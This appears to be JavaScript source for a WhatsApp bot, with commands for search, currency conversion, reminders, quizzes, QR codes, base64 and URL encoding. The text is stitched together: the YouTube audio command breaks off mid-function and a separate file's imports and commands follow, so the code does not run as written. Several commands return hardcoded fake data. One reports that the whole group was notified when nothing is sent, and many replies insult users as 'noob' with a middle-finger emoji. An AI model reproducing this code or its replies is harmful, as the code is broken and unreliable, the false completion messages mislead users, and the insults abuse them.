        { name: "Italic", value: convertToUnicode(text, 0x1D482, 0x1D49C) }
      ];
      
      let message = `✨ *Fancy Text Styles for:* ${text}\n\n`;
      styles.forEach(style => {
        message += `*${style.name}:* ${style.value}\n`;
      });
      
      message += `\nTip: Try .fancy <number> ${text} to use specific number styles!`;
      
      await repondre(message);
    }
  } catch (error) {
    console.error("Error in fancy command:", error);
    await repondre(`💀 FANCY TEXT FAILED! Error: ${error.message}\nText is resisting!`);
  }
  
  // Helper function to convert text to Unicode styles
  function convertToUnicode(text, lowerOffset, upperOffset) {
    return text.split("").map(char => {
      const code = char.charCodeAt(0);
      if (code >= 97 && code <= 122) return String.fromCharCode(code - 97 + lowerOffset);
      if (code >= 65 && code <= 90) return String.fromCharCode(code - 65 + upperOffset);
      return char;
    }).join("");
  }
});

hango({
  nomCom: "google",
  aliases: ["search", "gsearch"],
  desc: "Search Google directly from WhatsApp",
  categorie: "search",
  reaction: '🔍',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const query = arg.join(" ");
    
    if (!query) {
      return repondre("🖕 WHERE'S THE QUERY, YOU NOOB? Example: .google WhatsApp features");
    }
    
    // Using SerpApi for Google search results
    const serpApiKey = conf.SERPAPI_KEY || "demo"; // Replace with your SerpAPI key in config
    const searchUrl = `https://serpapi.com/search.json?q=${encodeURIComponent(query)}&api_key=${serpApiKey}`;
    
    await repondre("🔍 Searching Google for: *" + query + "*");
    
    const response = await axios.get(searchUrl);
    const results = response.data.organic_results || [];
    
    if (results.length === 0) {
      return repondre("🖕 NO RESULTS FOUND, YOU NOOB!");
    }
    
    // Format top 3 results
    let message = `🔍 *Google Search Results*\n\n`;
    const topResults = results.slice(0, 3);
    
    topResults.forEach((result, index) => {
      message += `*${index + 1}. ${result.title}*\n`;
      message += `${result.snippet || "No description available."}\n`;
      message += `🔗 ${result.link}\n\n`;
    });
    
    message += `For more results: https://google.com/search?q=${encodeURIComponent(query)}`;
    
    await repondre(message);
  } catch (error) {
    console.error("Error in google command:", error);
    await repondre(`💀 SEARCH FAILED! Error: ${error.message}\nGoogle is resisting!`);
  }
});

hango({
  nomCom: "wiki",
  aliases: ["wikipedia", "wikisearch"],
  desc: "Search Wikipedia for information",
  categorie: "info",
  reaction: '📖',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
🖕 WHERE'S THE SEARCH TERM, YOU NOOB?

📝 *Usage:*
.wiki Albert Einstein
.wiki Solar System
.wiki Artificial Intelligence
      `);
    }
    
    const searchTerm = arg.join(" ");
    
    await repondre(`⏳ Searching Wikipedia for "${searchTerm}"...`);
    
    // In a real implementation, you would use the Wikipedia API
    // This is a simulation with a few hardcoded articles
    const wikiArticles = {
      "albert einstein": {
        title: "Albert Einstein",
        extract: "Albert Einstein (14 March 1879 – 18 April 1955) was a German-born theoretical physicist who is widely held to be one of the greatest and most influential scientists of all time. Best known for developing the theory of relativity, he also made important contributions to quantum mechanics, and was thus a central figure in the revolutionary reshaping of the scientific understanding of nature that modern physics accomplished in the first decades of the twentieth century.",
        url: "https://en.wikipedia.org/wiki/Albert_Einstein"
      },
      "solar system": {
        title: "Solar System",
        extract: "The Solar System is the gravitationally bound system of the Sun and the objects that orbit it. It formed 4.6 billion years ago from the gravitational collapse of a giant interstellar molecular cloud. The vast majority of the system's mass is in the Sun, with most of the remaining mass contained in the planet Jupiter.",
        url: "https://en.wikipedia.org/wiki/Solar_System"
      },
      "artificial intelligence": {
        title: "Artificial Intelligence",
        extract: "Artificial intelligence (AI) is intelligence demonstrated by machines, as opposed to the natural intelligence displayed by animals including humans. AI research has been defined as the field of study of intelligent agents, which refers to any system that perceives its environment and takes actions that maximize its chance of achieving its goals.",
        url: "https://en.wikipedia.org/wiki/Artificial_intelligence"
      }
    };
    
    // Check if we have a matching article (case insensitive)
    const matchingKey = Object.keys(wikiArticles).find(
      key => key.toLowerCase() === searchTerm.toLowerCase()
    );
    
    if (matchingKey) {
      const article = wikiArticles[matchingKey];
      
      let message = `📖 *WIKIPEDIA: ${article.title}*\n\n`;
      message += `${article.extract}\n\n`;
      message += `*Read more:* ${article.url}\n\n`;
      message += `_Note: This is a simulated Wikipedia result. In a real implementation, actual data would be fetched from the Wikipedia API._`;
      
      await repondre(message);
    } else {
      // Simulate a "no results" response
      await repondre(`
🖕 NO WIKI ARTICLE FOUND, YOU NOOB!

Try searching for:
• Albert Einstein
• Solar System
• Artificial Intelligence

_Note: This is a simulation. In a real implementation, the Wikipedia API would be used for comprehensive searches._
      `);
    }
  } catch (error) {
    console.error("Error in wiki command:", error);
    repondre(`💀 WIKI SEARCH FAILED! Error: ${error.message}\nWikipedia is resisting!`);
  }
});

hango({
  nomCom: "currency",
  aliases: ["convert", "exchange"],
  desc: "Convert between currencies",
  categorie: "tools",
  reaction: '💱',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 3) {
      return repondre(`
🖕 WHERE'S THE AMOUNT, SOURCE CURRENCY, AND TARGET CURRENCY, YOU NOOB?

📝 *Usage:*
.currency 100 USD EUR
.currency 50 GBP JPY

*Common currency codes:*
• USD - US Dollar
• EUR - Euro
• GBP - British Pound
• JPY - Japanese Yen
• CAD - Canadian Dollar
• AUD - Australian Dollar
• CNY - Chinese Yuan
• INR - Indian Rupee
      `);
    }
    
    const amount = parseFloat(arg[0]);
    if (isNaN(amount)) {
      return repondre("🖕 WHERE'S THE VALID NUMBER FOR THE AMOUNT, YOU NOOB?");
    }
    
    const fromCurrency = arg[1].toUpperCase();
    const toCurrency = arg[2].toUpperCase();
    
    await repondre(`⏳ Converting ${amount} ${fromCurrency} to ${toCurrency}...`);
    
    // In a real implementation, you would use a currency conversion API
    // This is a simulation with some hardcoded rates
    const exchangeRates = {
      "USD": {
        "EUR": 0.92,
        "GBP": 0.79,
        "JPY": 145.85,
        "CAD": 1.34,
        "AUD": 1.48,
        "CNY": 7.21,
        "INR": 83.12
      },
      "EUR": {
        "USD": 1.09,
        "GBP": 0.86,
        "JPY": 158.32,
        "CAD": 1.46,
        "AUD": 1.61,
        "CNY": 7.83,
        "INR": 90.22
      },
      "GBP": {
        "USD": 1.27,
        "EUR": 1.17,
        "JPY": 184.47,
        "CAD": 1.70,
        "AUD": 1.88,
        "CNY": 9.12,
        "INR": 105.16
      }
    };
    
    if (!exchangeRates[fromCurrency]) {
      return repondre(`🖕 CURRENCY ${fromCurrency} NOT SUPPORTED, YOU NOOB! Try with USD, EUR, or GBP.`);
    }
    
    if (!exchangeRates[fromCurrency][toCurrency]) {
      return repondre(`🖕 CONVERSION FROM ${fromCurrency} TO ${toCurrency} NOT SUPPORTED, YOU NOOB!`);
    }
    
    const rate = exchangeRates[fromCurrency][toCurrency];
    const convertedAmount = amount * rate;
    
    await repondre(`
💱 *CURRENCY CONVERSION*

*${amount} ${fromCurrency} = ${convertedAmount.toFixed(2)} ${toCurrency}*

*Exchange Rate:* 1 ${fromCurrency} = ${rate} ${toCurrency}
*Date:* ${new Date().toLocaleDateString()}

_Note: This is a simulated conversion. In a real implementation, current rates would be fetched from an API._
    `);
  } catch (error) {
    console.error("Error in currency command:", error);
    repondre(`💀 CURRENCY CONVERSION FAILED! Error: ${error.message}\nCurrency exchange is resisting!`);
  }
});

hango({
  nomCom: "reminder",
  aliases: ["remind", "schedule"],
  desc: "Set a reminder for the group",
  categorie: "group",
  reaction: '⏰',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("🖕 THIS COMMAND CAN ONLY BE USED IN A GROUP CHAT, YOU NOOB!");
    }
    
    if (arg.length < 2) {
      return repondre(`
🖕 WHERE'S THE TIME AND MESSAGE, YOU NOOB?

📝 *Usage:*
.reminder 5m Meeting starts soon!
.reminder 2h Don't forget to submit your reports
.reminder 1d Tomorrow's event reminder

*Time units:* s (seconds), m (minutes), h (hours), d (days)
      `);
    }
    
    const timeArg = arg[0].toLowerCase();
    const reminderText = arg.slice(1).join(" ");
    
    // Extract number and unit from time argument
    const match = timeArg.match(/^(\d+)([smhd])$/);
    
    if (!match) {
      return repondre("🖕 INVALID TIME FORMAT, YOU NOOB! Use format like: 5m, 2h, 1d");
    }
    
    const timeValue = parseInt(match[1]);
    const timeUnit = match[2];
    
    // Convert to milliseconds and human-readable format
    let timeMs = 0;
    let readableTime = "";
    
    switch (timeUnit) {
      case 's':
        timeMs = timeValue * 1000;
        readableTime = timeValue === 1 ? "1 second" : `${timeValue} seconds`;
        break;
      case 'm':
        timeMs = timeValue * 60 * 1000;
        readableTime = timeValue === 1 ? "1 minute" : `${timeValue} minutes`;
        break;
      case 'h':
        timeMs = timeValue * 60 * 60 * 1000;
        readableTime = timeValue === 1 ? "1 hour" : `${timeValue} hours`;
        break;
      case 'd':
        timeMs = timeValue * 24 * 60 * 60 * 1000;
        readableTime = timeValue === 1 ? "1 day" : `${timeValue} days`;
        break;
    }
    
    // Get group metadata
    const groupMetadata = await hn.groupMetadata(dest.chat);
    
    // Confirm reminder set
    await repondre(`⏰ Group reminder set! Everyone will be reminded about "${reminderText}" in ${readableTime}.`);
    
    // Set the reminder
    setTimeout(async () => {
      try {
        // Create mentions array for all participants
        const mentions = groupMetadata.participants.map(p => p.id);
        
        // Create a message that tags everyone
        let mentionText = "";
        groupMetadata.participants.forEach(participant => {
          mentionText += `@${participant.id.split('@')[0]} `;
        });
        
        // Send the reminder with mentions
        await hn.sendMessage(dest.chat, {
          text: `⏰ *GROUP REMINDER*\n\n${reminderText}\n\n${mentionText}`,
          mentions: mentions
        });
      } catch (error) {
        console.error("Error in group reminder execution:", error);
      }
    }, timeMs);
    
  } catch (error) {
    console.error("Error in reminder command:", error);
    repondre(`💀 REMINDER FAILED! Error: ${error.message}\nGroup reminder is resisting!`);
  }
});

hango({
  nomCom: "quiz",
  aliases: ["trivia", "question"],
  desc: "Start a quiz with various categories",
  categorie: "fun",
  reaction: '🧠',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const categories = ["general", "science", "history", "geography", "sports", "entertainment"];
    let category = "general";
    
    if (arg[0] && categories.includes(arg[0].toLowerCase())) {
      category = arg[0].toLowerCase();
    }
    
    if (arg[0] && !categories.includes(arg[0].toLowerCase())) {
      return repondre(`
🖕 INVALID CATEGORY, YOU NOOB! Please choose from:
${categories.join(", ")}

📝 *Usage:*
.quiz science
.quiz history
      `);
    }
    
    await repondre(`⏳ Preparing a ${category} quiz question...`);
    
    // In a real implementation, you would fetch from a trivia API
    // This is a simulation with some hardcoded questions
    const quizQuestions = {
      "general": [
        {
          question: "What is the capital of France?",
          options: ["London", "Berlin", "Paris", "Madrid"],
          answer: "Paris"
        },
        {
          question: "Which planet is known as the Red Planet?",
          options: ["Venus", "Mars", "Jupiter", "Saturn"],
          answer: "Mars"
        }
      ],
      "science": [
        {
          question: "What is the chemical symbol for gold?",
          options: ["Go", "Gd", "Au", "Ag"],
          answer: "Au"
        },
        {
          question: "What is the hardest natural substance on Earth?",
          options: ["Platinum", "Diamond", "Titanium", "Quartz"],
          answer: "Diamond"
        }
      ],
      "history": [
        {
          question: "Who was the first President of the United States?",
          options: ["Thomas Jefferson", "George Washington", "Abraham Lincoln", "John Adams"],
          answer: "George Washington"
        },
        {
          question: "In which year did World War II end?",
          options: ["1943", "1944", "1945", "1946"],
          answer: "1945"
        }
      ]
    };
    
    // Default to general if the selected category isn't in our simulation
    const availableQuestions = quizQuestions[category] || quizQuestions["general"];
    const randomQuestion = availableQuestions[Math.floor(Math.random() * availableQuestions.length)];
    
    // Send the question
    let questionMsg = `🧠 *QUIZ: ${category.toUpperCase()}*\n\n`;
    questionMsg += `*Question:* ${randomQuestion.question}\n\n`;
    questionMsg += `*Options:*\n`;
    
    randomQuestion.options.forEach((option, index) => {
      questionMsg += `${index + 1}. ${option}\n`;
    });
    
    questionMsg += `\nReply with the number of your answer within 30 seconds!`;
    
    await repondre(questionMsg);
    
    // In a real implementation, you would listen for answers and check them
    // This is a simulation of the answer reveal
    setTimeout(async () => {
      let answerMsg = `⏱️ *TIME'S UP!*\n\n`;
      answerMsg += `*Question:* ${randomQuestion.question}\n`;
      answerMsg += `*Correct Answer:* ${randomQuestion.answer}\n\n`;
      answerMsg += `_Note: This is a simulated quiz. In a real implementation, answers would be collected and scored._`;
      
      await repondre(answerMsg);
    }, 10000); // Reduced to 10 seconds for simulation
    
  } catch (error) {
    console.error("Error in quiz command:", error);
    repondre(`💀 QUIZ FAILED! Error: ${error.message}\nQuiz is resisting!`);
  }
});

hango({
  nomCom: "schedule",
  aliases: ["event", "plan"],
  desc: "Schedule an event for the group",
  categorie: "group",
  reaction: '📅',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("🖕 THIS COMMAND CAN ONLY BE USED IN A GROUP CHAT, YOU NOOB!");
    }
    
    if (arg.length < 3) {
      return repondre(`
🖕 WHERE'S THE DATE, TIME, AND EVENT DESCRIPTION, YOU NOOB?

📝 *Usage:*
.schedule 2023-10-15 14:30 Team meeting to discuss the new project
.schedule tomorrow 20:00 Game night with friends
.schedule Saturday 18:00 Weekend party at John's place
      `);
    }
    
    const date = arg[0];
    const time = arg[1];
    const eventDescription = arg.slice(2).join(" ");
    
    // Validate date format
    const isValidDate = (
      /^\d{4}-\d{2}-\d{2}$/.test(date) || 
      /^(today|tomorrow|monday|tuesday|wednesday|thursday|friday|saturday|sunday)$/i.test(date)
    );
    
    // Validate time format
    const isValidTime = /^([01]?[0-9]|2[0-3]):[0-5][0-9]$/.test(time);
    
    if (!isValidDate) {
      return repondre("🖕 INVALID DATE FORMAT, YOU NOOB! Use YYYY-MM-DD or day names like 'tomorrow' or 'Monday'.");
    }
    
    if (!isValidTime) {
      return repondre("🖕 INVALID TIME FORMAT, YOU NOOB! Use 24-hour format like 14:30 or 09:15.");
    }
    
    // Get user's name
    const senderName = dest.pushName || dest.sender.split('@')[0];
    
    // In a real implementation, you would store the event in a database
    // This is a simulation
    await repondre(`
📅 *EVENT SCHEDULED*

*Event:* ${eventDescription}
*Date:* ${date}
*Time:* ${time}
*Created by:* ${senderName}

✅ Everyone in the group has been notified of this event!

_Note: This is a simulated event scheduler. In a real implementation, events would be stored and reminders would be sent automatically._
    `);
  } catch (error) {
    console.error("Error in schedule command:", error);
    repondre(`💀 EVENT SCHEDULING FAILED! Error: ${error.message}\nEvent scheduler is resisting!`);
  }
});

hango({
  nomCom: "birthday",
  aliases: ["bday", "birthdays"],
  desc: "Manage birthday reminders for group members",
  categorie: "group",
  reaction: '🎂',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // Check if command is used in a group
    if (!dest.isGroup) {
      return repondre("🖕 THIS COMMAND CAN ONLY BE USED IN A GROUP CHAT, YOU NOOB!");
    }
    
    if (!arg[0]) {
      return repondre(`
🖕 WHERE'S THE ACTION, YOU NOOB?

📝 *Usage:*
• .birthday add MM-DD - Add your birthday
• .birthday list - List all birthdays
• .birthday remove - Remove your birthday
      `);
    }
    
    const action = arg[0].toLowerCase();
    
    if (action === "add") {
      if (!arg[1] || !arg[1].match(/^(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/)) {
        return repondre("🖕 WHERE'S THE VALID BIRTHDAY DATE IN MM-DD FORMAT, YOU NOOB? (e.g., 05-15 for May 15).");
      }
      
      const birthdayDate = arg[1];
      const userName = dest.pushName || dest.sender.split('@')[0];
      
      // In a real implementation, you would store this in a database
      // This is a simulation
      await repondre(`
✅ Birthday added successfully!

*User:* ${userName}
*Birthday:* ${birthdayDate}

I'll remind the group when your birthday comes!

_Note: This is a simulation. In a real implementation, birthdays would be stored in a database and automatic reminders would be sent._
      `);
    } 
    else if (action === "list") {
      // In a real implementation, you would fetch from a database
      // This is a simulation with hardcoded data
      await repondre(`
🎂 *GROUP BIRTHDAYS*

• John: 01-15 (January 15)
• Alice: 03-22 (March 22)
• Robert: 07-09 (July 9)
• Emma: 11-30 (November 30)

_Note: This is simulated data. In a real implementation, actual stored birthdays would be displayed._
      `);
    } 
    else if (action === "remove") {
      const userName = dest.pushName || dest.sender.split('@')[0];
      
      // In a real implementation, you would remove from a database
      // This is a simulation
      await repondre(`
✅ Birthday removed successfully!

*User:* ${userName}

Your birthday has been removed from the reminder list.

_Note: This is a simulation. In a real implementation, the birthday would be removed from a database._
      `);
    } 
    else {
      repondre(`
🖕 INVALID ACTION, YOU NOOB! Please use one of:
• add
• list
• remove
      `);
    }
  } catch (error) {
    console.error("Error in birthday command:", error);
    repondre(`💀 BIRTHDAY MANAGEMENT FAILED! Error: ${error.message}\nBirthday database is resisting!`);
  }
});

hango({
  nomCom: "qrcode",
  aliases: ["qr", "genqr"],
  desc: "Generate a QR code from text",
  categorie: "tools",
  reaction: '📲',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
🖕 WHERE'S THE TEXT OR URL, YOU NOOB?

📝 *Usage:*
.qrcode https://example.com
.qrcode Your text here
      `);
    }
    
    const content = arg.join(" ");
    
    // Use Google Chart API to generate real QR code
    const qrSize = 300;
    const qrUrl = `https://chart.googleapis.com/chart?cht=qr&chs=${qrSize}x${qrSize}&chl=${encodeURIComponent(content)}&chld=H|1`;
    
    // Send QR code image
    await hn.sendMessage(dest.chat, {
      image: { url: qrUrl },
      caption: `📲 QR Code for:\n${content}`
    });
  } catch (error) {
    console.error("Error in qrcode command:", error);
    repondre(`💀 QR CODE GENERATION FAILED! Error: ${error.message}\nQR code generator is resisting!`);
  }
});

hango({
  nomCom: "gif",
  aliases: ["gifsearch", "findgif"],
  desc: "Search for a GIF",
  categorie: "media",
  reaction: '🎬',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
🖕 WHERE'S THE SEARCH TERM, YOU NOOB?

📝 *Usage:*
.gif cute cats
.gif thank you
.gif funny
      `);
    }
    
    const searchTerm = arg.join(" ");
    
    await repondre(`⏳ Searching for "${searchTerm}" GIFs...`);
    
    // In a real implementation, you would use Tenor, GIPHY, or another GIF API
    // This is a simulation
    const simulatedGifUrls = [
      "https://media.tenor.com/images/sample1.gif",
      "https://media.giphy.com/media/sample2.gif",
      "https://i.imgur.com/sample3.gif"
    ];
    
    const randomGifUrl = simulatedGifUrls[Math.floor(Math.random() * simulatedGifUrls.length)];
    
    // In a real implementation, you would send the actual GIF
    // This is a placeholder message
    await repondre(`
🎬 *GIF SEARCH*

*Search term:* ${searchTerm}

_Note: This is a simulation. In a real implementation, a GIF matching "${searchTerm}" would be fetched from an API and sent here._
    `);
  } catch (error) {
    console.error("Error in gif command:", error);
    repondre(`💀 GIF SEARCH FAILED! Error: ${error.message}\nGIF search is resisting!`);
  }
});

hango({
  nomCom: "voicenote",
  aliases: ["ttsaudio", "sayaudio"],
  desc: "Convert text to voice note",
  categorie: "media",
  reaction: '🎙️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (arg.length < 1) {
      return repondre(`
🖕 WHERE'S THE TEXT, YOU NOOB?

📝 *Usage:*
.voicenote Hello, this is a test of text to voice note
      `);
    }
    
    const text = arg.join(" ");
    
    await repondre(`⏳ Converting text to voice note...`);
    
    // In a real implementation, you would use a Text-to-Speech API to generate audio
    // and then send it as a voice note
    // This is a simulation message
    await repondre(`
🎙️ *TEXT TO VOICE NOTE*

*Text:* ${text}

_Note: This is a simulation. In a real implementation, your text would be converted to an audio file and sent as a voice note using a Text-to-Speech API._
    `);
  } catch (error) {
    console.error("Error in voicenote command:", error);
    repondre(`💀 TEXT TO VOICE NOTE FAILED! Error: ${error.message}\nText-to-Speech is resisting!`);
  }
});

hango({
  nomCom: "worldclock",
  aliases: ["time", "timezone"],
  desc: "Check time in different cities around the world",
  categorie: "info",
  reaction: '🕒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    // List of major cities and their timezone offsets
    const timeZones = {
      "london": { name: "London", offset: 0 }, // GMT+0
      "newyork": { name: "New York", offset: -5 }, // GMT-5
      "losangeles": { name: "Los Angeles", offset: -8 }, // GMT-8
      "tokyo": { name: "Tokyo", offset: 9 }, // GMT+9
      "sydney": { name: "Sydney", offset: 10 }, // GMT+10
      "paris": { name: "Paris", offset: 1 }, // GMT+1
      "dubai": { name: "Dubai", offset: 4 }, // GMT+4
      "mumbai": { name: "Mumbai", offset: 5.5 }, // GMT+5:30
      "singapore": { name: "Singapore", offset: 8 }, // GMT+8
      "moscow": { name: "Moscow", offset: 3 } // GMT+3
    };
    
    if (!arg[0]) {
      // If no city is specified, show time for all cities
      const now = new Date();
      let message = `🕒 *WORLD CLOCK*\n\n`;
      
      Object.values(timeZones).forEach(zone => {
        const localTime = new Date(now.getTime() + (zone.offset * 60 + now.getTimezoneOffset()) * 60000);
        message += `*${zone.name}:* ${localTime.toTimeString().slice(0, 5)}\n`;
      });
      
      await repondre(message);
    } else {
      // Check time for specific city
      const cityName = arg.join(" ").toLowerCase().replace(/\s/g, "");
      
      if (timeZones[cityName]) {
        const now = new Date();
        const zone = timeZones[cityName];
        const localTime = new Date(now.getTime() + (zone.offset * 60 + now.getTimezoneOffset()) * 60000);
        
        await repondre(`
🕒 *TIME IN ${zone.name.toUpperCase()}*

*Current Time:* ${localTime.toTimeString().slice(0, 5)}
*Date:* ${localTime.toDateString()}
        `);
      } else {
        let availableCities = Object.values(timeZones).map(zone => zone.name).join(", ");
        
        await repondre(`
🖕 CITY NOT FOUND, YOU NOOB!

*Available cities:*
${availableCities}

📝 *Usage:*
.worldclock Tokyo
.worldclock New York
        `);
      }
    }
  } catch (error) {
    console.error("Error in worldclock command:", error);
    repondre(`💀 TIME CHECK FAILED! Error: ${error.message}\nWorld clock is resisting!`);
  }
});

hango({
  nomCom: "whois",
  aliases: ["useinfo", "checkuser"],
  desc: "Get information about a user",
  categorie: "group",
  reaction: '👤',
}, async (dest, hn, context) => {
  const { repondre } = context;
  
  try {
    // Check if a user is tagged
    if (!dest.quoted) {
      return repondre("🖕 TAG A USER BY REPLYING TO THEIR MESSAGE, YOU NOOB!");
    }
    
    const taggedUser = dest.quoted.sender;
    const userName = dest.quoted.pushName || taggedUser.split('@')[0];
    
    // Get user profile picture if possible
    let ppUrl;
    try {
      ppUrl = await hn.profilePictureUrl(taggedUser, 'image');
    } catch {
      ppUrl = null;
    }
    
    // Get user status
    let userStatus;
    try {
      const status = await hn.fetchStatus(taggedUser);
      userStatus = status.status || "No status";
    } catch {
      userStatus = "No status available";
    }
    
    // Check if user is an admin (if in group)
    let adminStatus = "N/A";
    if (dest.isGroup) {
      const groupMetadata = await hn.groupMetadata(dest.chat);
      const isAdmin = groupMetadata.participants.find(p => p.id === taggedUser && (p.admin === 'admin' || p.admin === 'superadmin'));
      adminStatus = isAdmin ? "Yes" : "No";
    }
    
    // Format and send user information
    let message = `👤 *USER INFORMATION*\n\n`;
    message += `*Name:* ${userName}\n`;
    message += `*Number:* ${taggedUser.split('@')[0]}\n`;
    message += `*Status:* ${userStatus}\n`;
    
    if (dest.isGroup) {
      message += `*Admin:* ${adminStatus}\n`;
    }
    
    // Send with profile picture if available
    if (ppUrl) {
      await hn.sendMessage(dest.chat, {
        image: { url: ppUrl },
        caption: message
      });
    } else {
      await repondre(message);
    }
  } catch (error) {
    console.error("Error in whois command:", error);
    repondre(`💀 USER INFORMATION FAILED! Error: ${error.message}\nUser info is resisting!`);
  }
});

hango({
  nomCom: "ytaudio",
  aliases: ["ytmp3", "ytmusic"],
  desc: "Download audio from a YouTube video",
  categorie: "download",
  reaction: '🎵',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    if (!arg[0]) {
      return repondre(`
🖕 WHERE'S THE YOUTUBE URL, YOU NOOB?

📝 *Usage:*
.ytaudio https://www.youtube.com/watch?v=dQw4w9WgXcQ
      `);
    }
    
    const url = arg[0];
    
    // Check if it's a valid YouTube URL
    if (!url.match(/^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)/)) {
      return repondre("🖕 WHERE'S THE VALID YOUTUBE URL, YOU NOOB?");
    }
    
    await repondre("⏳ Processing audio download, please wait...");
    
    // Use y2mate API to extract audio
const { hango } = require("../framework/hango");
const conf = require(__dirname + "/../set");
const axios = require('axios');
const cheerio = require('cheerio');
const crypto = require('crypto');
const os = require('os');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const net = require('net');

hango({
  nomCom: "timezone",
  aliases: ["timee", "datee"],
  desc: "Check the current local time and date for a specified timezone.",
  categorie: "new",
  reaction: '🕰️',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const timezone = arg[0];

  if (!timezone) {
    return repondre("❌ Please provide a timezone code. Example: .timezone TZ");
  }

  try {
    // Get current date and time
    const now = new Date();
    
    // Get local time and date in the specified timezone
    const options = { 
      hour: "2-digit", 
      minute: "2-digit", 
      second: "2-digit", 
      hour12: true, 
      timeZone: timezone 
    };

    const timeOptions = { 
      ...options, 
      weekday: "long", 
      year: "numeric", 
      month: "long", 
      day: "numeric" 
    };

    const localTime = now.toLocaleTimeString("en-US", options);
    const localDate = now.toLocaleDateString("en-US", timeOptions);

    // Send the local time and date as reply
    repondre(`🕰️ *Current Local Time:* ${localTime}\n📅 *Current Date:* ${localDate}`);
  } catch (e) {
    console.error("Error in .timezone command:", e);
    repondre("❌ An error occurred. Please try again later.");
  }
});

hango({
  nomCom: "color",
  aliases: ["rcolor", "colorcode"],
  desc: "Generate a random color with name and code.",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  
  try {
    const colorNames = [
      "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Pink", "Brown", "Black", "White", 
      "Gray", "Cyan", "Magenta", "Violet", "Indigo", "Teal", "Lavender", "Turquoise"
    ];
    
    const randomColorHex = "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
    const randomColorName = colorNames[Math.floor(Math.random() * colorNames.length)];

    repondre(`🎨 *Random Color:* \nName: ${randomColorName}\nCode: ${randomColorHex}`);
  } catch (e) {
    console.error("Error in .color command:", e);
    repondre("❌ An error occurred while generating the random color.");
  }
});

hango({
  nomCom: "binary",
  aliases: ["binarydgt", "binarycode"],
  desc: "Convert text into binary format",
  categorie: "script",
  reaction: '🤦',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre('Please provide a text to convert to binary.');
  }

  try {
    const binaryText = text.split('').map(char => {
      return `00000000${char.charCodeAt(0).toString(2)}`.slice(-8);
    }).join(' ');

    repondre(`🔑 *Binary Representation:* \n${binaryText}`);
  } catch (e) {
    console.error("Error in .binary command:", e);
    repondre("❌ An error occurred while converting to binary.");
  }
});

hango({
  nomCom: "dbinary",
  aliases: ["binarydecode", "decodebinary"],
  desc: "Decode binary string into text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");
  
  if (!text) {
    return repondre("❌ Please provide the binary string to decode.");
  }

  try {
    const binaryString = text;
    const textDecoded = binaryString.split(' ').map(bin => {
      return String.fromCharCode(parseInt(bin, 2));
    }).join('');

    repondre(`🔓 *Decoded Text:* \n${textDecoded}`);
  } catch (e) {
    console.error("Error in .dbinary command:", e);
    repondre("❌ An error occurred while decoding the binary string.");
  }
});

hango({
  nomCom: "base64",
  aliases: ["base64encode", "encodebase64"],
  desc: "Encode text into Base64 format.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into Base64.");
  }

  try {
    // Encode the text into Base64
    const encodedText = Buffer.from(text).toString('base64');
    
    // Send the encoded Base64 text
    repondre(`🔑 *Encoded Base64 Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .base64 command:", e);
    repondre("❌ An error occurred while encoding the text into Base64.");
  }
});

hango({
  nomCom: "unbase64",
  aliases: ["base64decode", "decodebase64"],
  desc: "Decode Base64 encoded text.",
  categorie: "script",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the Base64 encoded text to decode.");
  }

  try {
    // Decode the Base64 text
    const decodedText = Buffer.from(text, 'base64').toString('utf-8');
    
    // Send the decoded text
    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .unbase64 command:", e);
    repondre("❌ An error occurred while decoding the Base64 text.");
  }
});

hango({
  nomCom: "urlencode",
  aliases: ["urlencode", "encodeurl"],
  desc: "Encode text into URL encoding.",
  categorie: "script",
  reaction: '🔒',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the text to encode into URL encoding.");
  }

  try {
    // Encode the text into URL encoding
    const encodedText = encodeURIComponent(text);

    // Send the encoded URL text
    repondre(`🔑 *Encoded URL Text:* \n${encodedText}`);
  } catch (e) {
    console.error("Error in .urlencode command:", e);
    repondre("❌ An error occurred while encoding the text.");
  }
});

hango({
  nomCom: "urldecode",
  aliases: ["decodeurl", "urldecode"],
  desc: "Decode URL encoded text.",
  categorie: "coding",
  reaction: '🔓',
}, async (dest, hn, context) => {
  const { repondre, arg } = context;
  const text = arg.join(" ");

  if (!text) {
    return repondre("❌ Please provide the URL encoded text to decode.");
  }

  try {
    const decodedText = decodeURIComponent(text);

    repondre(`🔓 *Decoded Text:* \n${decodedText}`);
  } catch (e) {
    console.error("Error in .urldecode command:", e);
